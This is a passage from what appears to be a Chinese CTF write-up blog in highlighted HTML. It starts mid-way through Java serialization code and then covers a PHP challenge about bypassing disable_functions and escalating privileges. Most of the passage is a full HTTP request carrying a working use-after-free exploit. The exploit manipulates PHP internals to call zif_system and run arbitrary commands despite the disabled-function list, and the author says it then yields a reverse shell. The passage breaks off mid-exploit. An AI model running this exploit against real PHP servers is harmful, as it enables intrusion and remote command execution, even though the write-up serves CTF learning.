class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) SerAndDe.deserialize(bytes);</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个小细节，为了让对象在服务端顺利反序列化，该对象的类里开头的<code>package</code>语句，也就是位置需要和服务端一致。</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317003858-r22uayy.png" alt="image.png"></p><h1 id="interesting-php"><a href="#interesting-php" class="headerlink" title="interesting php"></a>interesting php</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>考点为bypass disable_functions和提权</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试发现ban了许多函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));<span class="comment">//读目录</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">ini_get_all</span>());<span class="comment">//读php.ini</span></span><br></pre></td></tr></table></figure><blockquote><p>disable_functions:</p><p>include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var</p></blockquote><p>很明显的<code>file_put_contents</code>和<code>fputs</code>没ban</p><h2 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h2><p>使用这个项目：<a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass">https://github.com/mm0r1/exploits/tree/master/php-filter-bypass</a></p><p>需要注意的是：</p><ul><li>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundarytTUJ5AxeIGFMSfxf</li><li>——WebKitFormBoundarytTUJ5AxeIGFMSfxf<br>Content-Disposition: form-data; name&#x3D;”1”</li></ul><p>这两处，然后就可以反弹shell</p><p><a href="https://www.jianshu.com/p/29e38bcc8a1d">深入解析 multipart&#x2F;form-data</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?exp=eval($_POST[1]);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6889</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarytTUJ5AxeIGFMSfxf</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81/?exp=eval($_POST[1]);</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17eec4fcc66536-0975948f3634ff-576153e-154ac4-17eec4fcc67914</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarytTUJ5AxeIGFMSfxf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;whoami&#x27;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment">#pwn($_POST[1]);</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGING&#x27;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="number">0x60</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="number">0x20</span> : CHUNK_DATA_SIZE);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="number">0x70</span> : <span class="number">0x50</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMD&#x27;</span>, <span class="variable">$cmd</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$groom</span>[] = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">stream_filter_register</span>(<span class="string">&#x27;pwn_filter&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$fd</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fd</span>,<span class="string">&#x27;pwn_filter&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$fd</span>, <span class="string">&#x27;x&#x27;</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> <span class="keyword">extends</span> <span class="title">php_user_filter</span> </span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$abc</span>, <span class="variable">$abc_addr</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$helper</span>, <span class="variable">$helper_addr</span>, <span class="variable">$helper_off</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$uafp</span>, <span class="variable">$hfp</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$in</span>, <span class="variable">$out</span>, &amp;<span class="variable">$consumed</span>, <span class="variable">$closing</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="variable">$closing</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">stream_bucket_make_writeable</span>(<span class="variable">$in</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filtername = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;stream);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">go</span>();</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> PSFS_PASS_ON;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;abc = &amp;<span class="variable language_">$this</span>-&gt;filtername;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">make_uaf_obj</span>();</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper_addr = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="number">2</span> - <span class="number">0x18</span>) - CHUNK_SIZE * <span class="number">2</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;helper_addr);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;abc_addr = <span class="variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;abc_addr);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper_off = <span class="variable language_">$this</span>-&gt;helper_addr - <span class="variable language_">$this</span>-&gt;abc_addr - <span class="number">0x18</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$helper_handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_leaker</span>();</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$helper_handlers</span> + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;binary leak @ 0x%x&quot;</span>, <span class="variable">$binary_leak</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_cleanup</span>(<span class="variable">$binary_leak</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$closure_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$closure_ce</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$closure_ce</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$fake_closure_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="number">2</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$fake_closure_addr</span> = <span class="variable language_">$this</span>-&gt;helper_addr + <span class="variable">$fake_closure_off</span> - <span class="variable language_">$this</span>-&gt;helper_off;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>, <span class="variable">$fake_closure_addr</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanup</span>();</span></span><br><span class="line"><span class="language-php">        (<span class="variable language_">$this</span>-&gt;helper-&gt;b)(CMD);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">make_uaf_obj</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;uafp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;uafp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQQ&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xDEADBAADC0DE</span>));</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; STRING_SIZE; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;uafp, <span class="string">&quot;\x00&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_leaker</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$str_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span> + <span class="number">0x10</span>, <span class="number">6</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$val_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x48</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span>, <span class="variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span> + <span class="number">8</span>, <span class="number">0xA</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_cleanup</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$ret_gadget</span> = <span class="variable">$binary_leak</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="language-php">            --<span class="variable">$ret_gadget</span>;</span></span><br><span class="line"><span class="language-php">        &#125; <span class="keyword">while</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$ret_gadget</span>, <span class="number">1</span>) !== <span class="number">0xC3</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;ret gadget = 0x%x&quot;</span>, <span class="variable">$ret_gadget</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr + <span class="number">0x20</span> - (PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x50</span> : <span class="number">0x60</span>));</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">8</span>, <span class="variable">$ret_gadget</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">16</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable">$value</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;helper-&gt;c);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$value</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable language_">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re 